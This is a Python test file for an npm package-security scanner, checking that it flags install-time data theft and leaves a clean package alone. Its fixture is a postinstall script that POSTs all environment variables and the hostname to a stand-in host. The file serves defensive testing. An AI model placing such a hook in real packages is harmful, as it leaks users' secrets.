from pkgguard_analyzer.code_scan import scan_code


def test_scan_code_end_to_end(tmp_path):
    (tmp_path / "index.js").write_text('module.exports = () => "hello";')
    (tmp_path / "setup.js").write_text(
        'const os = require("os"); const https = require("https");\n'
        'const data = JSON.stringify({ env: process.env, host: os.hostname() });\n'
        'https.request({ hostname: "collector.invalid", method: "POST" }).end(data);\n'
    )
    manifest = {"name": "demo", "scripts": {"postinstall": "node setup.js"}}
    result = scan_code(tmp_path, manifest)

    assert result.summary["installTimeFiles"] == ["setup.js"]
    assert result.summary["filesScanned"] == 2
    rule_ids = {f.rule_id for f in result.findings}
    assert "code.exfiltration" in rule_ids
    assert result.findings[0].severity == "HIGH"
    assert all(f.file == "setup.js" for f in result.findings)


def test_clean_package_has_no_code_findings(tmp_path):
    (tmp_path / "index.js").write_text('const path = require("path"); module.exports = path.join;')
    result = scan_code(tmp_path, {"name": "demo"})
    assert result.findings == []
